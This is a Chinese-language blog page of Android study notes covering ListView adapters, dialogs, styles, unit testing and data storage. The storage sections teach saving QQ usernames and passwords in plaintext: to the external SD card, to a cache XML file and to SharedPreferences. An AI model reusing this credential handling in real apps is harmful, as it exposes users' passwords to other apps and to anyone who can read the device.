//第二个参数 layout布局 在tv_item.xml中定义textview
//第三个 string数组
lv.setAdapter(new ArrayAdapter&lt;String&gt;(this, R.layout.tv_item, new String[]{&quot;功能1&quot;,&quot;功能2&quot;,&quot;功能3&quot;,&quot;功能4&quot;}));
</code></pre></li>
</ul>
<p>##2.8 如何将Xml数据(Layout布局文件)转换成View对象?   </p>
<ul>
<li>LayoutInflater (填充器, 打气筒)</li>
<li>LayoutInflater 打气筒, 将一个xml的布局文件填充成一个View对象, 以便添加到其他View容器中. </li>
</ul>
<p>-示例：将Xml数据(Layout布局文件)转换成View对象———————–</p>
<pre><code>public class MainActivity extends Activity {

List&lt;Person&gt; persons;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    // 设置界面布局
    setContentView(R.layout.activity_main);

    // 1. 查找控件
    ListView lv_content = (ListView) findViewById(R.id.lv_content);

    // 2. 准备数据
    PersonDAO3 dao = new PersonDAO3(this);
    persons = dao.queryAll();

    System.out.println(&quot;persons: &quot; + persons.size());

    // 3. 给ListView设置数据适配器, ListView此时要向Adapter索取数据
    lv_content.setAdapter(new MyAdapter());

}

class MyAdapter extends BaseAdapter {

    @Override
    public int getCount() {
        // 返回ListView总共要显示的个数
        return persons.size();
    }

    /**
     * 一旦ListView设置了Adapter, 就会从这个方法索要View
     */
    @Override
    public View getView(int position, View convertView, ViewGroup parent) {

        // ------------------------------------------------- 重点 ↓

        LayoutInflater inflater = LayoutInflater.from(MainActivity.this);
        // LayoutInflater 打气筒, 将一个xml的布局文件填充成一个View对象, 以便添加到其他View容器中. 

        // root 你想把这个View填充完之后, 添加到哪个ViewGroup(View容器, LinearLayout, RelativeLayout).
        // root就是这个容器

        //LinearLayout是View的子类
        LinearLayout layout = null;
        if(convertView != null){
            layout = (LinearLayout) convertView;
        }else {
            layout = (LinearLayout) inflater.inflate(R.layout.item_listview, null);
        }

        // ------------------------------------------------- 以上 ↑

        // 找到里边的控件

        // 设置数据
        ImageView iv_header = (ImageView) MainActivity.this.findViewById(R.id.iv_header);
        TextView tv_name = (TextView) layout.findViewById(R.id.tv_name);
        TextView tv_age = (TextView) layout.findViewById(R.id.tv_age);
        TextView tv_balance = (TextView) layout.findViewById(R.id.tv_balance);

        Person person = persons.get(position);
        tv_name.setText(person.getName());
        tv_age.setText(person.getAge() + &quot;&quot;);
        tv_balance.setText(person.getBalance() + &quot;&quot;);

        return layout;
    }

    @Override
    public Object getItem(int position) {
        return null;
    }

    @Override
    public long getItemId(int position) {
        return 0;
    }

}
}
还有两个layout布局文件没粘过来
1.activity_main.xml中定义ListView布局
2.item_listview.xml中定义LinearLayout布局，横向设置，添加ImageView+LinearLayout，LinearLayout中又添加3个TextView
</code></pre><ul>
<li>BaseAdapter : 最重要的Adapter!!!!!!!!!!!!!!!!!!!!</li>
</ul>
<h2 id="Android-对话框"><a href="#Android-对话框" class="headerlink" title="Android 对话框"></a>Android 对话框</h2><ul>
<li>通过Builder实现通知对话框，列表对话框，单选对话框</li>
<li><p>通知对话框</p>
<pre><code>/**
 * 显示通知对话框 示例：通过一个按钮点击，弹出通知对话框
 * @param view
 */
public void showNotifyDialog(View view){

    Builder builder = new AlertDialog.Builder(this);
    // 设置图标
    builder.setIcon(android.R.drawable.ic_dialog_alert);
    // 设置标题
    builder.setTitle(&quot;提醒:&quot;);
    // 设置提醒内容
    builder.setMessage(&quot;当前是移动网络数据, 建议在wifi下观看, 是否继续(土豪随意)&quot;);

    builder.setPositiveButton(&quot;确认&quot;, new OnClickListener() {

        @Override
        public void onClick(DialogInterface dialog, int which) {
            Toast.makeText(MainActivity.this, &quot;确认&quot;, 0).show();

        }
    });
    builder.setNegativeButton(&quot;取消&quot;, new OnClickListener() {

        @Override
        public void onClick(DialogInterface dialog, int which) {
            Toast.makeText(MainActivity.this, &quot;取消&quot;, 0).show();
        }
    });

    builder.setCancelable(false); // 是否可以通过返回键 关闭

    // 直接show();
    builder.show();
</code></pre><p>  }</p>
</li>
<li><p>列表对话框</p>
<pre><code>/**
 * 显示列表对话框
 * @param view
 */
public void showListDialog(View view){

    Builder builder = new AlertDialog.Builder(this);
    builder.setTitle(&quot;选择语言&quot;);
    String[] strs = new String[]{&quot;java&quot;, &quot;c++&quot;, &quot;c&quot; , &quot;php&quot;, &quot;c#&quot;, &quot;c&quot; , &quot;php&quot;, &quot;c#&quot;};
    builder.setItems(strs, new OnClickListener() {

        @Override
        public void onClick(DialogInterface dialog, int which) {
            //点击之后自动跳回上一页,然后执行下面代码,参数2:表示点击了哪一个
            System.out.println(&quot;which: &quot; + which);
        }
    });

    builder.show();

}
</code></pre></li>
<li><p>单选对话框</p>
<pre><code>/**
 *  显示单选框
 *  setSingleChoiceItems()
 *  参数1:字符串数组,要选择的选项
 *  参数2:默认选择
 *  参数3:点击监听
 * @param view
 */
public void showSingleDialog(View view){

    Builder builder = new AlertDialog.Builder(this);
    builder.setTitle(&quot;选择性别:&quot;);

    final String[] items = new String[]{&quot;男&quot;, &quot;女&quot;, &quot;中性&quot;, &quot;以前男的女的&quot;, &quot;以前是女的男的&quot;};

    builder.setSingleChoiceItems(items, -1, new OnClickListener() {

        @Override
        public void onClick(DialogInterface dialog, int which) {
            System.out.println(&quot;which: &quot; + which);

        }
    });

    builder.setPositiveButton(&quot;确认&quot;, null);
    builder.show();

}
</code></pre></li>
<li><p>多选对话框</p>
<pre><code>public void showMultiDialog(View view){

    Builder builder = new AlertDialog.Builder(this);
    builder.setTitle(&quot;选择兴趣爱好:&quot;);

    final String[] items = new String[]{&quot;抽烟&quot;, &quot;喝酒&quot;, &quot;烫头&quot;, &quot;编程&quot;, &quot;泡妞&quot;};
    final boolean[] checkedItems = new boolean[]{true, false, true ,false, false};

    builder.setMultiChoiceItems(items,checkedItems , new OnMultiChoiceClickListener() {

        @Override
        public void onClick(DialogInterface dialog, int which, boolean isChecked) {
            System.out.println(&quot;which: &quot; + which + &quot; isChecked: &quot; + isChecked);            
            checkedItems[which] = isChecked;
        }
    });
    builder.setPositiveButton(&quot;确认&quot;, null);

    builder.show();
}    
</code></pre></li>
</ul>
<p>ProgressDialog</p>
<ul>
<li><p>进度对话框</p>
<p>  public void showProgressDialog(View view){</p>
<pre><code>// 显示一个加载的对话框
//ProgressDialog.show(this, &quot;提示: &quot;, &quot;正在加载中,请稍后...&quot;);

final ProgressDialog progressDialog = new ProgressDialog(this);
progressDialog.setTitle(&quot;提示: &quot;);
progressDialog.setMessage(&quot;正在加载中...&quot;);
// 设置样式为 横向 的
progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);

progressDialog.setMax(100);

// 显示的时候, 会把进度归零
progressDialog.show();

new Thread(){
    public void run() {

        while(true){

            SystemClock.sleep(50);
            //progressDialog.setProgress(i);
            progressDialog.incrementProgressBy(1);

            if(progressDialog.getProgress() &gt;= progressDialog.getMax()){
                progressDialog.dismiss();
                break;
            }
        }
    };
}.start();
</code></pre><p>  }</p>
</li>
</ul>
<p>##样式和主题</p>
<ul>
<li>样式设置<ul>
<li>res/values/styles.xml中将样式抽取出来</li>
<li>就是在styles.xml文件中将view的一些属性抽取出来定义在styles属性中，之后只要调用就行了</li>
</ul>
</li>
</ul>
<p>-样式示例：————————————————–</p>
<pre><code> &lt;style name=&quot;text_style&quot;&gt;
    &lt;item name=&quot;android:layout_width&quot;&gt;wrap_content&lt;/item&gt;
    &lt;item name=&quot;android:layout_height&quot;&gt;wrap_content&lt;/item&gt;
    &lt;item name=&quot;android:layout_margin&quot;&gt;20dp&lt;/item&gt;
    &lt;item name=&quot;android:background&quot;&gt;#660000FF&lt;/item&gt;
    &lt;item name=&quot;android:padding&quot;&gt;15dp&lt;/item&gt;
    &lt;item name=&quot;android:textColor&quot;&gt;#FFFFFF&lt;/item&gt;
    &lt;item name=&quot;android:textSize&quot;&gt;20sp&lt;/item&gt;
&lt;/style&gt;

&lt;style name=&quot;text_style_red&quot; parent=&quot;text_style&quot;&gt;
    &lt;item name=&quot;android:background&quot;&gt;#66FF0000&lt;/item&gt;
&lt;/style&gt;
</code></pre><p>-样式调用示例：———————————</p>
<pre><code>  &lt;TextView
    style=&quot;@style/text_style&quot;
    android:text=&quot;功能1&quot; /&gt;

&lt;TextView
    style=&quot;@style/text_style_red&quot;
    android:text=&quot;功能2&quot; /&gt;

&lt;TextView
    style=&quot;@style/text_style_red&quot;
    android:text=&quot;功能3&quot; /&gt;

&lt;TextView
    style=&quot;@style/text_style&quot;
    android:text=&quot;功能4&quot; /&gt;
</code></pre><ul>
<li>主题设置</li>
<li>在AndroidManifest.xml中设置</li>
<li>在application标签下的Android:theme=””修改值，可改变主题</li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/02-数据存储/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/02/13/02-数据存储/" itemprop="url">
                  02 数据存储
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T09:43:23+08:00">
                2017-02-13
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#Android 数据存储</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul>
<li><p>黑盒测试</p>
<ul>
<li>测试人员不知道源代码</li>
</ul>
</li>
<li><p>白盒测试</p>
<ul>
<li>测试人员知道源代码, 写测试用例</li>
</ul>
</li>
</ul>
<h3 id="按测试粒度-精细度-区分"><a href="#按测试粒度-精细度-区分" class="headerlink" title="按测试粒度(精细度)区分"></a>按测试粒度(精细度)区分</h3><ul>
<li>方法测试 (function test)</li>
<li>集成测试 (integration test)</li>
<li>系统测试 (system test)</li>
</ul>
<h2 id="单元测试框架-Junit"><a href="#单元测试框架-Junit" class="headerlink" title="单元测试框架(Junit)"></a>单元测试框架(Junit)</h2><p>Android的代码只能运行在手机中的Dalvik虚拟机里, 在PC机的JVM下会报错异常. 写测试用例, 通过将测试代码上传到Android手机或模拟器中运行.</p>
<h2 id="Android下单元测试的流程"><a href="#Android下单元测试的流程" class="headerlink" title="Android下单元测试的流程"></a>Android下单元测试的流程</h2><p><img src="day02_01.jpg" alt="文件权限"></p>
<ol>
<li><p>写业务逻辑类，里面有待测试的方法</p>
<pre><code>public class CalcService {

    public int sum(int a,int b){
        return a+b;
    }
}
</code></pre></li>
<li>写测试用例类, 一个类继承AndroidTestCase</li>
<li><p>写测试方法public void testAdd() throws Exception{}</p>
<pre><code>public class TestCalcService extends AndroidTestCase{

    public void testSum(){
        CalcService cs = new CalcService();
        int result = cs.sum(12, 3);
        //断言 判断结果是否与预期一致，如果不一致，抛出异常
        assertEquals(15, result);

    }
}
</code></pre></li>
<li>单元测试需要配置清单文件？？？？？？    <ul>
<li>在AndroidManifest.xml文件中配置</li>
<li>1 指定测试用的指令集 在manifest的子节点，包名指向MainActivity.java所在的包名</li>
<li>2 指定测试用的库 在application节点下</li>
</ul>
</li>
</ol>
<hr>
<pre><code>&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
    package=&quot;com.itheima.junit&quot;
    android:versionCode=&quot;1&quot;
    android:versionName=&quot;1.0&quot; &gt;

    &lt;!--    1. 指定测试用的指令集 在manifest的子节点 --&gt;
    &lt;instrumentation
        android:name=&quot;android.test.InstrumentationTestRunner&quot;
        android:targetPackage=&quot;com.itheima.junit&quot; &gt;
    &lt;/instrumentation&gt;

    &lt;application
        android:icon=&quot;@drawable/ic_launcher&quot;
        android:label=&quot;@string/app_name&quot;&gt;

            &lt;!--   2. 指定测试用的库 在application节点下--&gt;
            &lt;uses-library android:name=&quot;android.test.runner&quot;/&gt;

    &lt;/application&gt;
&lt;/manifest&gt;
</code></pre><ol>
<li>选中测试方法, 右键 Run as -&gt; Android JUnit Test</li>
</ol>
<h2 id="Android-下的logcat"><a href="#Android-下的logcat" class="headerlink" title="Android 下的logcat"></a>Android 下的logcat</h2><ul>
<li>Log.v : verbose 提示  黑色</li>
<li>Log.d : debug 调试  蓝色</li>
<li>Log.i : info 提醒  绿色</li>
<li>Log.w : warn 警告  橙色</li>
<li>Log.e : error 错误  红色</li>
</ul>
<h2 id="保存数据到SD卡-mnt-sdcard-info-txt"><a href="#保存数据到SD卡-mnt-sdcard-info-txt" class="headerlink" title="保存数据到SD卡 /mnt/sdcard/info.txt"></a>保存数据到SD卡 /mnt/sdcard/info.txt</h2><ul>
<li>获取外置sd卡目录: Environment.getExternalStorageDirectory()</li>
<li>获取挂载状态: Environment.getExternalStorageState()</li>
<li><p>获取sd卡剩余空间:Environment.getExternalStorageDirectory().getUsableSpace();</p>
</li>
<li><p>示例</p>
</li>
</ul>
<hr>
<pre><code>public void login(View view) {
    // 点击事件
    // 1. 获取用户名密码
    String qq = et_qq.getText().toString().trim();
    String pwd = et_pwd.getText().toString().trim();

    try {
        // 检查数据, 如果有一个是空字符串, 则弹出吐司提醒？？？？？
        if (TextUtils.isEmpty(qq) || TextUtils.isEmpty(pwd)) {
            // 吐司(面包), 在界面上显示一个提示, 一定记住要调用show()方法.

            // Context上下文
            Toast.makeText(this, &quot;用户名或密码不能为空&quot;, Toast.LENGTH_SHORT).show();
        } else {
            // System.out.println(&quot;qq: &quot; + qq + &quot; pwd: &quot; + pwd);
            // 检查是否勾选了
            boolean isChecked = cb_remember.isChecked();
            if (isChecked) {
                // 要记住密码
                Log.d(TAG, &quot;勾选了记住密码&quot;);
                // 保存当前用户名密码 到sdcard
                // File file = new File(&quot;/mnt/sdcard/info.txt&quot;);
                // /storage/sdcard0
                // /mnt/storage
                // 获取外置sd卡挂载状态？？？？？
                String state = Environment.getExternalStorageState();
                if (Environment.MEDIA_MOUNTED.equals(state)) {
                    // sd卡已挂载,可以写入

                    // 获取sd卡剩余空间
                    long usableSpace = Environment
                            .getExternalStorageDirectory().getUsableSpace();
                    System.out.println(&quot;usableSpace: &quot; + usableSpace);

                    // 获取外置SD卡的目录？？？？
                    File path = Environment.getExternalStorageDirectory();
                    FileOutputStream fos = new FileOutputStream(new File(
                            path, &quot;info.txt&quot;));
                    String str = qq + &quot;##&quot; + pwd;
                    fos.write(str.getBytes());
                    fos.close();

                    System.out.println(&quot;---------------------------&quot; + str);
                } else {
                    // sd未挂载
                    Toast.makeText(this, &quot;保存失败, 请检查sd卡&quot;, Toast.LENGTH_SHORT)
                            .show();
                }
            } else {
                // 不记住密码
                Log.d(TAG, &quot;不记住密码&quot;);
            }
        }

    } catch (Exception e) {
        e.printStackTrace();
    }
}
</code></pre><h2 id="从SD卡读取数据-并显示到控件上"><a href="#从SD卡读取数据-并显示到控件上" class="headerlink" title="从SD卡读取数据 并显示到控件上"></a>从SD卡读取数据 并显示到控件上</h2><pre><code>// 读取之前的数据,并显示到控件上
try {
    // 得到输入流, 读取数据
    File path = Environment.getExternalStorageDirectory();
    FileInputStream fis = new FileInputStream(
            new File(path, &quot;info.txt&quot;));
    //读取的是字符流
    BufferedReader br = new BufferedReader(new InputStreamReader(fis));
    // 读取一行
    String line = br.readLine();
    // aaa##123
    String qq = line.split(&quot;##&quot;)[0];
    String pwd = line.split(&quot;##&quot;)[1];
    et_qq.setText(qq);
    et_pwd.setText(pwd);

} catch (Exception e) {
    e.printStackTrace();
}
</code></pre><h2 id="保存数据到内部存储设备-data-data-包名"><a href="#保存数据到内部存储设备-data-data-包名" class="headerlink" title="保存数据到内部存储设备 /data/data/包名/"></a>保存数据到内部存储设备 /data/data/包名/</h2><ul>
<li>应用私有文件夹, 默认情况下, 其他应用无法访问. 保证其数据安全</li>
<li>Context.getFilesDir() == /data/data/包名/files 用户文件目录</li>
<li>Context.getCacheDir() == /data/data/包名/cache 缓存目录</li>
</ul>
<p>示例：</p>
<pre><code>public void login(View v) {
// 点击事件
// 1. 获取用户名密码
String qq = et_qq.getText().toString().trim();
String pwd = et_pwd.getText().toString().trim();
try {
    // 检查数据, 如果有一个是空字符串, 则弹出吐司提醒
    if (TextUtils.isEmpty(qq) || TextUtils.isEmpty(pwd)) {
        // 吐司(面包), 在界面上显示一个提示, 一定记住要调用show()方法.
        // Context上下文
        Toast.makeText(this, &quot;用户名或密码不能为空&quot;, Toast.LENGTH_SHORT).show();
    } else {
        // System.out.println(&quot;qq: &quot; + qq + &quot; pwd: &quot; + pwd);
        // 检查是否勾选了
        boolean isChecked = cb_remember.isChecked();
        if (isChecked) {
            // 要记住密码
            // 保存当前用户名密码 到sdcard
            // 获取外置sd卡挂载状态
            String state = Environment.getExternalStorageState();
            if (Environment.MEDIA_MOUNTED.equals(state)) {
                // sd卡已挂载,可以写入
                // 获取sd卡剩余空间
                long usableSpace = Environment
                        .getExternalStorageDirectory().getUsableSpace();
                System.out.println(&quot;usableSpace: &quot; + usableSpace);
                // 获取外置SD卡的目录
                File path = Environment.getExternalStorageDirectory();
                FileOutputStream fos = new FileOutputStream(new File(
                        path, &quot;info.txt&quot;));
                String str = qq + &quot;##&quot; + pwd;
                fos.write(str.getBytes());
                fos.close();

                System.out.println(&quot;---------------------------&quot; + str);
            } else {
                // sd未挂载
                Toast.makeText(this, &quot;保存失败, 请检查sd卡&quot;, Toast.LENGTH_SHORT)
                        .show();
            }
        } else {
            // 不记住密码
            Log.d(TAG, &quot;不记住密码&quot;);
        }
    }

} catch (Exception e) {
    e.printStackTrace();
}
}
</code></pre><h2 id="Android权限机制"><a href="#Android权限机制" class="headerlink" title="Android权限机制"></a>Android权限机制</h2><ul>
<li>MODE_PRIVATE 私有文件</li>
<li>MODE_WORLD_READABLE 全局可读文件</li>
<li>MODE_WORLD_WRITEABLE 全局可写文件</li>
<li>MODE_WORLD_READABLE + MODE_WORLD_WRITEABLE 全局可读可写</li>
</ul>
<p>file_mode.png</p>
<p><img src="file_mode.png" alt="文件权限"></p>
<h2 id="重点-Android下-xml数据解析"><a href="#重点-Android下-xml数据解析" class="headerlink" title="(重点)Android下,xml数据解析"></a>(重点)Android下,xml数据解析</h2><ul>
<li>a. 创建xml解析器</li>
<li><pre><code>XmlPullParser parser = Xml.newPullParser();
</code></pre></li>
<li><p>b. 初始化xml解析器, 指定解析哪个流, 以什么编码解析</p>
<pre><code>parser.setInput(is, &quot;utf-8&quot;);
</code></pre></li>
<li><p>c. 解析xml数据</p>
<pre><code>while(type != XmlPullParser.END_DOCUMENT){ // 直到文档的结束
    // 读取数据
    ...
    type = parser.next(); // 到下一个
}
</code></pre></li>
<li><p>d. 扫尾工作</p>
<ul>
<li>关闭数据流</li>
</ul>
</li>
</ul>
<hr>
<pre><code>// 读取之前的数据,并显示到控件上
try {
    // 得到输入流, 读取数据
    File cache = getCacheDir();
    FileInputStream fis = new FileInputStream(new File(cache,
            &quot;user.xml&quot;));
    // a. 创建xml解析器
    XmlPullParser pullParse = Xml.newPullParser();
    // b. 初始化xml解析器, 指定解析哪个流, 以什么编码解析
    pullParse.setInput(fis, &quot;UTF-8&quot;);
    // c. 解析xml数据
    int type = pullParse.getEventType();// xml标签节点类型 头标签返回类型是0 根结束标签是1
    while (type != XmlPullParser.END_DOCUMENT) {// 循环的结束条件
        if (type == XmlPullParser.START_TAG) {
            if (&quot;qq&quot;.equals(pullParse.getName())) {
                String qq = pullParse.nextText();
                et_qq.setText(qq);
            } else if (&quot;pwd&quot;.equals(pullParse.getName())) {
                String pwd = pullParse.nextText();
                et_pwd.setText(pwd);
            }
        }
        // 循环 下一个
        type = pullParse.next();
    }
    // d 关闭数据流
    fis.close();

} catch (Exception e) {
    e.printStackTrace();
    System.out.println(&quot;解析异常!&quot;);
}
</code></pre><h2 id="Android下-xml的生成-序列化-（将JavaBean信息存放到xml中）"><a href="#Android下-xml的生成-序列化-（将JavaBean信息存放到xml中）" class="headerlink" title="Android下,xml的生成 (序列化) （将JavaBean信息存放到xml中）"></a>Android下,xml的生成 (序列化) （将JavaBean信息存放到xml中）</h2><p>a. 创建Xml序列化器</p>
<pre><code>XmlSerializer serializer = Xml.newSerializer();
</code></pre><p>b. 初始化xml序列化器, 设置输出流, 指定编码集</p>
<pre><code>serializer.setOutput(fos, &quot;utf-8&quot;);
</code></pre><p>c. 写xml数据<br>        // 文档的开头<br>        serializer.startDocument(“utf-8”, true);<br>        serializer.startTag(null, “info”);</p>
<pre><code>serializer.startTag(null, &quot;qq&quot;);
serializer.text(qq);
serializer.endTag(null, &quot;qq&quot;);

serializer.startTag(null, &quot;pwd&quot;);
serializer.text(pwd);
serializer.endTag(null, &quot;pwd&quot;);

serializer.endTag(null, &quot;info&quot;);
     // 文档的结束
serializer.endDocument();
</code></pre><p>d. fos.close();</p>
<p>示例：</p>
<pre><code>public void login(View v) {
    // 1. 获取用户名密码
    String qq = et_qq.getText().toString().trim();
    String pwd = et_pwd.getText().toString().trim();

    try {
        // 检查数据, 如果有一个是空字符串, 则弹出吐司提醒
        if (TextUtils.isEmpty(qq) || TextUtils.isEmpty(pwd)) {
            // 吐司(面包), 在界面上显示一个提示, 一定记住要调用show()方法.
            // Context上下文
            Toast.makeText(this, &quot;用户名或密码不能为空&quot;, Toast.LENGTH_SHORT).show();
        } else {
            // 检查是否勾选了
            boolean isChecked = cb_remember.isChecked();
            if (isChecked) {
                // 要记住密码
                // 获取临时缓存目录cache
                File cacheDir = this.getCacheDir();
                FileOutputStream fos = new FileOutputStream(new File(
                        cacheDir, &quot;user.xml&quot;));
                // a. 创建Xml序列化器
                XmlSerializer serializer = Xml.newSerializer();
                // b. 初始化xml序列化器, 设置输出流, 指定编码集
                serializer.setOutput(fos, &quot;utf-8&quot;);
                // c. 写xml数据
                // 文档的开头
                serializer.startDocument(&quot;utf-8&quot;, true);
                serializer.startTag(null, &quot;info&quot;);

                serializer.startTag(null, &quot;qq&quot;);
                serializer.text(qq);
                serializer.endTag(null, &quot;qq&quot;);

                serializer.startTag(null, &quot;pwd&quot;);
                serializer.text(pwd);
                serializer.endTag(null, &quot;pwd&quot;);

                serializer.endTag(null, &quot;info&quot;);
                // 文档的结束
                serializer.endDocument();

                Toast.makeText(this, &quot;保存成功&quot;, 0).show();

            } else {
                // 不记住密码
                Log.d(TAG, &quot;不记住密码&quot;);
            }
        }

    } catch (Exception e) {
        e.printStackTrace();
    }

}
</code></pre><ul>
<li>OutOfMemory (OOM) 内存溢出</li>
</ul>
<h2 id="SharedPreference"><a href="#SharedPreference" class="headerlink" title="SharedPreference"></a>SharedPreference</h2><ul>
<li>保存位置: /data/data/包名/shared_prefs/xxx.xml</li>
</ul>
<ol>
<li><p>初始化SharedPreferences  arg0:文件名  arg1:权限</p>
<pre><code>SharedPreferences sp = this.getSharedPreferences(&quot;config&quot;, MODE_PRIVATE);
</code></pre></li>
<li><p>通过SharedPreferences获取编辑器</p>
<pre><code>Editor editor = sp.edit();
</code></pre></li>
<li><p>写入数据</p>
<pre><code>editor.putString(&quot;qq&quot;, qq);
editor.putString(&quot;pwd&quot;, pwd);
editor.putBoolean(&quot;isChecked&quot;, isChecked);
</code></pre></li>
<li><p>提交数据</p>
<pre><code>editor.commit();
</code></pre></li>
</ol>
<p>-示例—————————</p>
<pre><code>//点击事件
public void login(View v){
    // 点击事件
    // 1. 获取用户名密码
    String qq = et_qq.getText().toString().trim();
    String pwd = et_pwd.getText().toString().trim();

    //2 用户名密码是否为空
    if (TextUtils.isEmpty(qq)||TextUtils.isEmpty(pwd)) {
        //用户名或密码为空 吐司
        Toast.makeText(this, &quot;用户名或密码不能为空&quot;, 0).show();
    } else {
        //用户名和密码都不为空
        //判断是否记住密码
        boolean isCheck = cb_remember.isChecked();
        if (isCheck) {
            //记住用户名密码，将其保存在内部存储设备
            //初始化SharedPreferences
            SharedPreferences sp = this.getSharedPreferences(&quot;user&quot;,MODE_PRIVATE );
            // 2. 通过SharedPreferences获取编辑器
             Editor edit = sp.edit();
            // 3. 写入数据
             edit.putString(&quot;qq&quot;, qq);
             edit.putString(&quot;pwd&quot;, pwd);
             edit.putBoolean(&quot;isCheck&quot;, isCheck);
            // 4. 提交数据
            edit.commit();
            Toast.makeText(this,&quot;保存成功&quot;, 0).show();
        } else {
            //不记住用户名密码
            Toast.makeText(this,&quot;没保存登录成功&quot;, 0).show();
        }
    }
}
</code></pre><h3 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h3><pre><code>// 1. 初始化SharedPreferences
SharedPreferences sp = this.getSharedPreferences(&quot;config&quot;, MODE_PRIVATE);

// 2. 读取数据, 设置数据
String qq = sp.getString(&quot;qq&quot;, &quot;&quot;);
boolean isChecked = sp.getBoolean(&quot;isChecked&quot;, false);
</code></pre><p>-示例——————————-</p>
<pre><code>@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    // 查找用户名输入框
    et_qq = (EditText) findViewById(R.id.et_qq);
    // 查找密码输入框
    et_pwd = (EditText) findViewById(R.id.et_pwd);
    // 查找CheckBox
    cb_remember = (CheckBox) findViewById(R.id.cb_remember);

    //回显用户名密码，显示在控件上
    //1 初始化SharedPreferences
    SharedPreferences sp = this.getSharedPreferences(&quot;user&quot;,MODE_PRIVATE );
    //2 读取数据，设置数据
    String qq = sp.getString(&quot;qq&quot;, &quot;&quot;);
    et_qq.setText(qq);

    String pwd = sp.getString(&quot;pwd&quot;, &quot;&quot;);
    et_pwd.setText(pwd);

    boolean isCheck = sp.getBoolean(&quot;isCheck&quot;,false);
    cb_remember.setChecked(isCheck);
}
</code></pre><ul>
<li><h1 id="超级管理员用户"><a href="#超级管理员用户" class="headerlink" title="超级管理员用户"></a>超级管理员用户</h1></li>
<li>$ 普通用户</li>
</ul>
<p>836959067</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/01-布局文件/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/02/13/01-布局文件/" itemprop="url">
                  01 布局文件
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T09:42:58+08:00">
                2017-02-13
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h4 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h4><blockquote>
<p> 布局文件<br> 开发工具: eclipse</p>
</blockquote>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/02/13/01-布局文件/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/03/Win上搭建Hexo+Github博客/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/02/03/Win上搭建Hexo+Github博客/" itemprop="url">
                  Win上搭建Hexo+Github博客
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
